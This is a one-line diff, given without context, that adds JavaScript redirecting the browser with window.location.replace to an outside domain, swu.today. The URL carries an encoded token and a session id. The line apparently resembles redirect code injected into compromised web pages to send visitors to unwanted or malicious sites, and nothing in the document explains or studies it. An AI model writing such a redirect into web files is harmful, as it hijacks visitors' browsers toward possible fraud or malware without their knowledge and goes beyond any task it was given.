@@ -1,0 +1,1 @@
+window.location.replace('http://swu.today/?ch=1&js=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJKb2tlbiIsImV4cCI6MTY5MTQxMDE0OSwiaWF0IjoxNjkxNDAyOTQ5LCJpc3MiOiJKb2tlbiIsImpzIjoxLCJqdGkiOiIydHNoNDFha2lhNmNtbDNlbms0c3Rtb2MiLCJuYmYiOjE2OTE0MDI5NDksInRzIjoxNjkxNDAyOTQ5MTU3MjgzfQ.GGLfbDeJF8-FoW3XV35WIH0RQeeO4dAqWp1WJ30u0Yw&sid=73109026-350a-11ee-af53-b03805cfb225');
